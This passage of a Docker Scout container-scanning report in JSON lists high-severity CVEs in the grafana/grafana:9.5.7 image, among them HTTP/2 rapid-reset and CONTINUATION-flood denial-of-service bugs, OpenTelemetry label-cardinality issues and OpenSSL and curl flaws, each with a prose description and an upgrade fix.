      "description": "A malicious HTTP/2 client which rapidly creates requests and immediately resets them can cause excessive server resource consumption. While the total number of requests is bounded by the http2.Server.MaxConcurrentStreams setting, resetting an in-progress request allows the attacker to create a new request while the existing one is still executing. \n\nWith the fix applied, HTTP/2 servers now bound the number of simultaneously executing handler goroutines to the stream concurrency limit (MaxConcurrentStreams). New requests arriving when at the limit (which can only happen after the client has reset an existing, in-flight request) will be queued until a handler exits. If the request queue grows too large, the server will terminate the connection. \n\nThis issue is also fixed in golang.org/x/net/http2 for users manually configuring HTTP/2.\n\nThe default stream concurrency limit is 250 streams (requests) per HTTP/2 connection. This value may be adjusted using the golang.org/x/net/http2 package; see the Server.MaxConcurrentStreams setting and the ConfigureServer function.",
      "cve": "CVE-2023-39325",
      "severity": "High",
      "confidence": "Unknown",
      "solution": "Upgrade golang.org/x/net@0.8.0 to 0.17.0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/golang.org/x/net@0.8.0"
          },
          "version": "0.8.0"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-39325",
          "value": "CVE-2023-39325",
          "url": "https://scout.docker.com/v/CVE-2023-39325?s=github&n=net&ns=golang.org%2Fx&t=golang&vr=%3C0.17.0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-39325?s=github&n=net&ns=golang.org%2Fx&t=golang&vr=%3C0.17.0"
        }
      ]
    },
    {
      "id": "ad63f9d2896591d3c2dd5cb7264217b096043e4911e678d4144ad2d2ccd05690",
      "category": "container_scanning",
      "message": "CVE-2023-39325 on stdlib@1.20.6",
      "description": "A malicious HTTP/2 client which rapidly creates requests and immediately resets them can cause excessive server resource consumption. While the total number of requests is bounded by the http2.Server.MaxConcurrentStreams setting, resetting an in-progress request allows the attacker to create a new request while the existing one is still executing.\n\nWith the fix applied, HTTP/2 servers now bound the number of simultaneously executing handler goroutines to the stream concurrency limit (MaxConcurrentStreams). New requests arriving when at the limit (which can only happen after the client has reset an existing, in-flight request) will be queued until a handler exits. If the request queue grows too large, the server will terminate the connection.\n\nThis issue is also fixed in golang.org/x/net/http2 for users manually configuring HTTP/2.\n\nThe default stream concurrency limit is 250 streams (requests) per HTTP/2 connection. This value may be adjusted using the golang.org/x/net/http2 package; see the Server.MaxConcurrentStreams setting and the ConfigureServer function.",
      "cve": "CVE-2023-39325",
      "severity": "High",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.20.10",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-39325",
          "value": "CVE-2023-39325",
          "url": "https://scout.docker.com/v/CVE-2023-39325?s=golang&n=stdlib&t=golang&vr=%3C1.20.10"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-39325?s=golang&n=stdlib&t=golang&vr=%3C1.20.10"
        }
      ]
    },
    {
      "id": "c866f79949b8e7fbc64d18142412c0a2738090ac95b189cefe4f254d669d5f07",
      "category": "container_scanning",
      "message": "CVE-2023-44487 on google.golang.org/grpc@1.45.0",
      "description": "An attacker can send HTTP/2 requests, cancel them, and send subsequent requests. This is valid by the HTTP/2 protocol, but would cause the gRPC-Go server to launch more concurrent method handlers than the configured maximum stream limit, grpc.MaxConcurrentStreams. This results in a denial of service due to resource consumption.",
      "cve": "CVE-2023-44487",
      "severity": "High",
      "confidence": "Unknown",
      "solution": "Upgrade google.golang.org/grpc@1.45.0 to 1.56.3",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/google.golang.org/grpc@1.45.0"
          },
          "version": "1.45.0"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-44487",
          "value": "CVE-2023-44487",
          "url": "https://scout.docker.com/v/CVE-2023-44487?s=golang&n=grpc&ns=google.golang.org&t=golang&vr=%3C1.56.3"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-44487?s=golang&n=grpc&ns=google.golang.org&t=golang&vr=%3C1.56.3"
        }
      ]
    },
    {
      "id": "0edc71698efd12d4bd486e3f5da4d5bb62fa621ce676a542fffbabf5166ec5c8",
      "category": "container_scanning",
      "message": "CVE-2023-44487 on alpine/nghttp2@1.51.0-r1",
      "cve": "CVE-2023-44487",
      "severity": "High",
      "confidence": "Unknown",
      "solution": "Upgrade alpine/nghttp2@1.51.0-r1 to 1.51.0-r2",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/nghttp2@1.51.0-r1?os_name=alpine&os_version=3.17"
          },
          "version": "1.51.0-r1"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-44487",
          "value": "CVE-2023-44487",
          "url": "https://scout.docker.com/v/CVE-2023-44487?s=alpine&n=nghttp2&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C1.51.0-r2"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-44487?s=alpine&n=nghttp2&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C1.51.0-r2"
        }
      ]
    },
    {
      "id": "b74da389a00bf75adb50d6d054ed931b9273a31cd2d9f3de6928b20d3971e4d7",
      "category": "container_scanning",
      "message": "CVE-2023-44487 on stdlib@1.20.6",
      "description": "A malicious HTTP/2 client which rapidly creates requests and immediately resets them can cause excessive server resource consumption. While the total number of requests is bounded by the http2.Server.MaxConcurrentStreams setting, resetting an in-progress request allows the attacker to create a new request while the existing one is still executing.\n\nWith the fix applied, HTTP/2 servers now bound the number of simultaneously executing handler goroutines to the stream concurrency limit (MaxConcurrentStreams). New requests arriving when at the limit (which can only happen after the client has reset an existing, in-flight request) will be queued until a handler exits. If the request queue grows too large, the server will terminate the connection.\n\nThis issue is also fixed in golang.org/x/net/http2 for users manually configuring HTTP/2.\n\nThe default stream concurrency limit is 250 streams (requests) per HTTP/2 connection. This value may be adjusted using the golang.org/x/net/http2 package; see the Server.MaxConcurrentStreams setting and the ConfigureServer function.",
      "cve": "CVE-2023-44487",
      "severity": "High",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.20.10",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-44487",
          "value": "CVE-2023-44487",
          "url": "https://scout.docker.com/v/CVE-2023-44487?s=golang&n=stdlib&t=golang&vr=%3C1.20.10"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-44487?s=golang&n=stdlib&t=golang&vr=%3C1.20.10"
        }
      ]
    },
    {
      "id": "73d036daa14d53bf22619a6ccbb9481bf53b5832150fb5fd2f225581b6bddf4b",
      "category": "container_scanning",
      "message": "CVE-2023-45142 on go.opentelemetry.io/contrib/instrumentation@0.37.0",
      "description": "### Summary\n\nThis handler wrapper https://github.com/open-telemetry/opentelemetry-go-contrib/blob/5f7e6ad5a49b45df45f61a1deb29d7f1158032df/instrumentation/net/http/otelhttp/handler.go#L63-L65\nout of the box adds labels\n\n- `http.user_agent`\n- `http.method`\n\nthat have unbound cardinality. It leads to the server's potential memory exhaustion when many malicious requests are sent to it.\n\n### Details\n\nHTTP header User-Agent or HTTP method for requests can be easily set by an attacker to be random and long. The library internally uses [httpconv.ServerRequest](https://github.com/open-telemetry/opentelemetry-go/blob/v1.12.0/semconv/internal/v2/http.go#L159) that records every value for HTTP [method](https://github.com/open-telemetry/opentelemetry-go/blob/38e1b499c3da3107694ad2660b3888eee9c8b896/semconv/internal/v2/http.go#L204) and [User-Agent](https://github.com/open-telemetry/opentelemetry-go/blob/38e1b499c3da3107694ad2660b3888eee9c8b896/semconv/internal/v2/http.go#L223).\n\n### PoC\n\nSend many requests with long randomly generated HTTP methods or/and User agents (e.g. a million) and observe how memory consumption increases during it.\n\n### Impact\n\nIn order to be affected, the program has to configure a metrics pipeline, use [otelhttp.NewHandler](https://github.com/open-telemetry/opentelemetry-go-contrib/blob/5f7e6ad5a49b45df45f61a1deb29d7f1158032df/instrumentation/net/http/otelhttp/handler.go#L63-L65) wrapper, and does not filter any unknown HTTP methods or User agents on the level of CDN, LB, previous middleware, etc.\n\n### Others\n\nIt is similar to already reported vulnerabilities\n- https://github.com/open-telemetry/opentelemetry-go-contrib/security/advisories/GHSA-5r5m-65gx-7vrh ([open-telemetry/opentelemetry-go-contrib](https://github.com/open-telemetry/opentelemetry-go-contrib))\n- https://github.com/advisories/GHSA-cg3q-j54f-5p7p ([prometheus/client_golang](https://github.com/prometheus/client_golang))\n\n### Workaround for affected versions\n\nAs a workaround to stop being affected [otelhttp.WithFilter()](https://pkg.go.dev/go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp/filters) can be used, but it requires manual careful configuration to not log certain requests entirely.\n\nFor convenience and safe usage of this library, it should by default mark with the label `unknown` non-standard HTTP methods and User agents to show that such requests were made but do not increase cardinality. In case someone wants to stay with the current behavior, library API should allow to enable it.\n\nThe other possibility is to disable HTTP metrics instrumentation by passing [`otelhttp.WithMeterProvider`](https://pkg.go.dev/go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp#WithMeterProvider) option with [`noop.NewMeterProvider`](https://pkg.go.dev/go.opentelemetry.io/otel/metric/noop#NewMeterProvider).\n\n### Solution provided by upgrading\n\nIn PR https://github.com/open-telemetry/opentelemetry-go-contrib/pull/4277, released with package version 0.44.0, the values collected for attribute `http.request.method` were changed to be restricted to a set of well-known values and other high cardinality attributes were removed.\n\n### References\n\n- https://github.com/open-telemetry/opentelemetry-go-contrib/pull/4277\n- https://github.com/open-telemetry/opentelemetry-go-contrib/releases/tag/v1.19.0\n",
      "cve": "CVE-2023-45142",
      "severity": "High",
      "confidence": "Unknown",
      "solution": "Upgrade go.opentelemetry.io/contrib/instrumentation@0.37.0 to 0.44.0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/go.opentelemetry.io/contrib/instrumentation@0.37.0#net/http/httptrace/otelhttptrace"
          },
          "version": "0.37.0"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-45142",
          "value": "CVE-2023-45142",
          "url": "https://scout.docker.com/v/CVE-2023-45142?s=github&n=net%2Fhttp%2Fhttptrace%2Fotelhttptrace&ns=go.opentelemetry.io%2Fcontrib%2Finstrumentation&t=golang&vr=%3C0.44.0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-45142?s=github&n=net%2Fhttp%2Fhttptrace%2Fotelhttptrace&ns=go.opentelemetry.io%2Fcontrib%2Finstrumentation&t=golang&vr=%3C0.44.0"
        }
      ]
    },
    {
      "id": "5e7e4913edc2636e5a5a948a4137faaaab398e53b6d941205379cb12dd4fb616",
      "category": "container_scanning",
      "message": "CVE-2023-45283 on stdlib@1.20.6",
      "description": "The filepath package does not recognize paths with a \\??\\ prefix as special.\n\nOn Windows, a path beginning with \\??\\ is a Root Local Device path equivalent to a path beginning with \\\\?\\. Paths with a \\??\\ prefix may be used to access arbitrary locations on the system. For example, the path \\??\\c:\\x is equivalent to the more common path c:\\x.\n\nBefore fix, Clean could convert a rooted path such as \\a\\..\\??\\b into the root local device path \\??\\b. Clean will now convert this to .\\??\\b.\n\nSimilarly, Join(\\, ??, b) could convert a seemingly innocent sequence of path elements into the root local device path \\??\\b. Join will now convert this to \\.\\??\\b.\n\nIn addition, with fix, IsAbs now correctly reports paths beginning with \\??\\ as absolute, and VolumeName correctly reports the \\??\\ prefix as a volume name.\n\nUPDATE: Go 1.20.11 and Go 1.21.4 inadvertently changed the definition of the volume name in Windows paths starting with \\?, resulting in filepath.Clean(\\?\\c:) returning \\?\\c: rather than \\?\\c:\\ (among other effects). The previous behavior has been restored.",
      "cve": "CVE-2023-45283",
      "severity": "High",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.20.11",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-45283",
          "value": "CVE-2023-45283",
          "url": "https://scout.docker.com/v/CVE-2023-45283?s=golang&n=stdlib&t=golang&vr=%3C1.20.11"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-45283?s=golang&n=stdlib&t=golang&vr=%3C1.20.11"
        }
      ]
    },
    {
      "id": "93d17889941b6a05cbdebb56d56a42cf14586e0efcc4f288e871059634cb5b22",
      "category": "container_scanning",
      "message": "CVE-2023-45288 on stdlib@1.20.6",
      "description": "An attacker may cause an HTTP/2 endpoint to read arbitrary amounts of header data by sending an excessive number of CONTINUATION frames.\n\nMaintaining HPACK state requires parsing and processing all HEADERS and CONTINUATION frames on a connection. When a request's headers exceed MaxHeaderBytes, no memory is allocated to store the excess headers, but they are still parsed.\n\nThis permits an attacker to cause an HTTP/2 endpoint to read arbitrary amounts of header data, all associated with a request which is going to be rejected. These headers can include Huffman-encoded data which is significantly more expensive for the receiver to decode than for an attacker to send.\n\nThe fix sets a limit on the amount of excess header frames we will process before closing a connection.",
      "cve": "CVE-2023-45288",
      "severity": "High",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.21.9",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-45288",
          "value": "CVE-2023-45288",
          "url": "https://scout.docker.com/v/CVE-2023-45288?s=golang&n=stdlib&t=golang&vr=%3C1.21.9"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-45288?s=golang&n=stdlib&t=golang&vr=%3C1.21.9"
        }
      ]
    },
    {
      "id": "7a4dfd50de326a36052dcbd2807369cf0c672dfbeb15367fb8eca569cf6e6e28",
      "category": "container_scanning",
      "message": "CVE-2023-47108 on go.opentelemetry.io/contrib/instrumentation@0.40.0",
      "description": "### Summary\n\nThe grpc Unary Server Interceptor [opentelemetry-go-contrib/instrumentation/google.golang.org/grpc/otelgrpc/interceptor.go](https://github.com/open-telemetry/opentelemetry-go-contrib/blob/9d4eb7e7706038b07d33f83f76afbe13f53d171d/instrumentation/google.golang.org/grpc/otelgrpc/interceptor.go#L327)\n\n```\n// UnaryServerInterceptor returns a grpc.UnaryServerInterceptor suitable\n// for use in a grpc.NewServer call.\nfunc UnaryServerInterceptor(opts ...Option) grpc.UnaryServerInterceptor {\n```\n  \nout of the box adds labels\n\n- `net.peer.sock.addr`\n- `net.peer.sock.port`\n\nthat have unbound cardinality. It leads to the server's potential memory exhaustion when many malicious requests are sent.\n\n### Details\n\nAn attacker can easily flood the peer address and port for requests.  \n\n### PoC\n\nApply the attached patch to the example and run the client multiple times.  Observe how each request will create a unique histogram and how the memory consumption increases during it.\n### Impact\n\nIn order to be affected, the program has to configure a metrics pipeline, use  [UnaryServerInterceptor](https://github.com/open-telemetry/opentelemetry-go-contrib/blob/9d4eb7e7706038b07d33f83f76afbe13f53d171d/instrumentation/google.golang.org/grpc/otelgrpc/interceptor.go#L327), and does not filter any client IP address and ports via middleware or proxies, etc.\n\n### Others\n\nIt is similar to already reported vulnerabilities.\n\n* [GHSA-rcjv-mgp8-qvmr](https://github.com/open-telemetry/opentelemetry-go-contrib/security/advisories/GHSA-rcjv-mgp8-qvmr) ([open-telemetry/opentelemetry-go-contrib](https://github.com/open-telemetry/opentelemetry-go-contrib))\n- [GHSA-5r5m-65gx-7vrh](https://github.com/open-telemetry/opentelemetry-go-contrib/security/advisories/GHSA-5r5m-65gx-7vrh \"GHSA-5r5m-65gx-7vrh\") ([open-telemetry/opentelemetry-go-contrib](https://github.com/open-telemetry/opentelemetry-go-contrib))\n- [GHSA-cg3q-j54f-5p7p](https://github.com/advisories/GHSA-cg3q-j54f-5p7p \"GHSA-cg3q-j54f-5p7p\") ([prometheus/client_golang](https://github.com/prometheus/client_golang))\n\n### Workaround for affected versions\n\nAs a workaround to stop being affected, a view removing the attributes can be used.\n\nThe other possibility is to disable grpc metrics instrumentation by passing [`otelgrpc.WithMeterProvider`](https://github.com/open-telemetry/opentelemetry-go-contrib/blob/instrumentation/google.golang.org/grpc/otelgrpc/v0.45.0/instrumentation/google.golang.org/grpc/otelgrpc/config.go#L138) option with [`noop.NewMeterProvider`](https://pkg.go.dev/go.opentelemetry.io/otel/metric/noop#NewMeterProvider).\n\n### Solution provided by upgrading\n\nIn PR [#4322](https://github.com/open-telemetry/opentelemetry-go-contrib/pull/4322), to be released with v0.46.0, the attributes were removed.\n\n### References\n\n- [#4322](https://github.com/open-telemetry/opentelemetry-go-contrib/pull/4322)",
      "cve": "CVE-2023-47108",
      "severity": "High",
      "confidence": "Unknown",
      "solution": "Upgrade go.opentelemetry.io/contrib/instrumentation@0.40.0 to 0.46.0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/go.opentelemetry.io/contrib/instrumentation@0.40.0#google.golang.org/grpc/otelgrpc"
          },
          "version": "0.40.0"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-47108",
          "value": "CVE-2023-47108",
          "url": "https://scout.docker.com/v/CVE-2023-47108?s=github&n=google.golang.org%2Fgrpc%2Fotelgrpc&ns=go.opentelemetry.io%2Fcontrib%2Finstrumentation&t=golang&vr=%3E%3D0.37.0%2C%3C0.46.0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-47108?s=github&n=google.golang.org%2Fgrpc%2Fotelgrpc&ns=go.opentelemetry.io%2Fcontrib%2Finstrumentation&t=golang&vr=%3E%3D0.37.0%2C%3C0.46.0"
        }
      ]
    },
    {
      "id": "87d47ca7d2c1fc3b8994c200c4aee4df28fb3c58382932b972d5ba091835c67e",
      "category": "container_scanning",
      "message": "CVE-2023-49568 on github.com/go-git/go-git@5.4.2",
      "description": "### Impact\nA denial of service (DoS) vulnerability was discovered in go-git versions prior to `v5.11`. This vulnerability allows an attacker to perform denial of service attacks by providing specially crafted responses from a Git server which triggers resource exhaustion in `go-git` clients. \n\nApplications using only the in-memory filesystem supported by `go-git` are not affected by this vulnerability.\nThis is a `go-git` implementation issue and does not affect the upstream `git` cli.\n\n### Patches\nUsers running versions of `go-git` from `v4` and above are recommended to upgrade to `v5.11` in order to mitigate this vulnerability.\n\n### Workarounds\nIn cases where a bump to the latest version of `go-git` is not possible, we recommend limiting its use to only trust-worthy Git servers.\n\n## Credit\nThanks to Ionut Lalu for responsibly disclosing this vulnerability to us.\n\n### References\n- [GHSA-mw99-9chc-xw7r](https://github.com/go-git/go-git/security/advisories/GHSA-mw99-9chc-xw7r)\n",
      "cve": "CVE-2023-49568",
      "severity": "High",
      "confidence": "Unknown",
      "solution": "Upgrade github.com/go-git/go-git@5.4.2 to 5.11.0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/github.com/go-git/go-git@5.4.2#v5"
          },
          "version": "5.4.2"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-49568",
          "value": "CVE-2023-49568",
          "url": "https://scout.docker.com/v/CVE-2023-49568?s=github&n=v5&ns=github.com%2Fgo-git%2Fgo-git&t=golang&vr=%3C5.11.0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-49568?s=github&n=v5&ns=github.com%2Fgo-git%2Fgo-git&t=golang&vr=%3C5.11.0"
        }
      ]
    },
    {
      "id": "66245a8333d6a383259dafe98d2e55e7e8bff431837e65a8792afd1e08ffe82f",
      "category": "container_scanning",
      "message": "CVE-2023-5363 on alpine/openssl@3.0.9-r1",
      "cve": "CVE-2023-5363",
      "severity": "High",
      "confidence": "Unknown",
      "solution": "Upgrade alpine/openssl@3.0.9-r1 to 3.0.12-r0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/openssl@3.0.9-r1?os_name=alpine&os_version=3.17"
          },
          "version": "3.0.9-r1"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-5363",
          "value": "CVE-2023-5363",
          "url": "https://scout.docker.com/v/CVE-2023-5363?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.12-r0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-5363?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.12-r0"
        }
      ]
    },
    {
      "id": "f5e407836cf253427fc7cbb39ad7ad6ba74f070b5657efeda46062bf8bd11947",
      "category": "container_scanning",
      "message": "CVE-2024-24784 on stdlib@1.20.6",
      "description": "The ParseAddressList function incorrectly handles comments (text within parentheses) within display names. Since this is a misalignment with conforming address parsers, it can result in different trust decisions being made by programs using different parsers.",
      "cve": "CVE-2024-24784",
      "severity": "High",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.21.8",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-24784",
          "value": "CVE-2024-24784",
          "url": "https://scout.docker.com/v/CVE-2024-24784?s=golang&n=stdlib&t=golang&vr=%3C1.21.8"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-24784?s=golang&n=stdlib&t=golang&vr=%3C1.21.8"
        }
      ]
    },
    {
      "id": "385e6f9c0f698a63b3f9295b4bbbaf35d7be48d26aacdb665d47a761212ce773",
      "category": "container_scanning",
      "message": "CVE-2024-24791 on stdlib@1.20.6",
      "description": "The net/http HTTP/1.1 client mishandled the case where a server responds to a request with an \"Expect: 100-continue\" header with a non-informational (200 or higher) status. This mishandling could leave a client connection in an invalid state, where the next request sent on the connection will fail.\n\nAn attacker sending a request to a net/http/httputil.ReverseProxy proxy can exploit this mishandling to cause a denial of service by sending \"Expect: 100-continue\" requests which elicit a non-informational response from the backend. Each such request leaves the proxy with an invalid connection, and causes one subsequent request using that connection to fail.",
      "cve": "CVE-2024-24791",
      "severity": "High",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.21.12",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-24791",
          "value": "CVE-2024-24791",
          "url": "https://scout.docker.com/v/CVE-2024-24791?s=golang&n=stdlib&t=golang&vr=%3C1.21.12"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-24791?s=golang&n=stdlib&t=golang&vr=%3C1.21.12"
        }
      ]
    },
    {
      "id": "1b926ad8f5c884804207e94ce30ebe382898c43f50e4676f7ad62f5c1ecc552b",
      "category": "container_scanning",
      "message": "CVE-2024-34156 on stdlib@1.20.6",
      "description": "Calling Decoder.Decode on a message which contains deeply nested structures can cause a panic due to stack exhaustion. This is a follow-up to CVE-2022-30635.",
      "cve": "CVE-2024-34156",
      "severity": "High",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.22.7",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-34156",
          "value": "CVE-2024-34156",
          "url": "https://scout.docker.com/v/CVE-2024-34156?s=golang&n=stdlib&t=golang&vr=%3C1.22.7"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-34156?s=golang&n=stdlib&t=golang&vr=%3C1.22.7"
        }
      ]
    },
    {
      "id": "8b3fa6b96a450765ed23b1e5e36f26b1fe7c768e3068e038a2dd70756b9f6b78",
      "category": "container_scanning",
      "message": "CVE-2024-34158 on stdlib@1.20.6",
      "description": "Calling Parse on a \"// +build\" build tag line with deeply nested expressions can cause a panic due to stack exhaustion.",
      "cve": "CVE-2024-34158",
      "severity": "High",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.22.7",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-34158",
          "value": "CVE-2024-34158",
          "url": "https://scout.docker.com/v/CVE-2024-34158?s=golang&n=stdlib&t=golang&vr=%3C1.22.7"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-34158?s=golang&n=stdlib&t=golang&vr=%3C1.22.7"
        }
      ]
    },
    {
      "id": "a1ae74912ccefecede6c03b9c1565c9bc5de65bf67277206f2884400a72afdd4",
      "category": "container_scanning",
      "message": "CVE-2024-4741 on alpine/openssl@3.0.9-r1",
      "cve": "CVE-2024-4741",
      "severity": "High",
      "confidence": "Unknown",
      "solution": "Upgrade alpine/openssl@3.0.9-r1 to 3.0.14-r0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/openssl@3.0.9-r1?os_name=alpine&os_version=3.17"
          },
          "version": "3.0.9-r1"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-4741",
          "value": "CVE-2024-4741",
          "url": "https://scout.docker.com/v/CVE-2024-4741?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.14-r0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-4741?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.14-r0"
        }
      ]
    },
    {
      "id": "e3d2dd87e9d39e448a9e59deff0e0764fc37c46ffd3d920c09a90b16c68f2e4d",
      "category": "container_scanning",
      "message": "CVE-2024-6119 on alpine/openssl@3.0.9-r1",
      "cve": "CVE-2024-6119",
      "severity": "High",
      "confidence": "Unknown",
      "solution": "Upgrade alpine/openssl@3.0.9-r1 to 3.0.15-r0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/openssl@3.0.9-r1?os_name=alpine&os_version=3.17"
          },
          "version": "3.0.9-r1"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-6119",
          "value": "CVE-2024-6119",
          "url": "https://scout.docker.com/v/CVE-2024-6119?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.15-r0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-6119?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.15-r0"
        }
      ]
    },
    {
      "id": "195a2da2323913e1f2a121f631318757f6171d210f701dc47c82a0eaac02c616",
      "category": "container_scanning",
      "message": "CVE-2024-6197 on alpine/curl@8.2.0-r1",
      "cve": "CVE-2024-6197",
      "severity": "High",
      "confidence": "Unknown",
      "solution": "Upgrade alpine/curl@8.2.0-r1 to 8.9.0-r0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/curl@8.2.0-r1?os_name=alpine&os_version=3.17"
          },
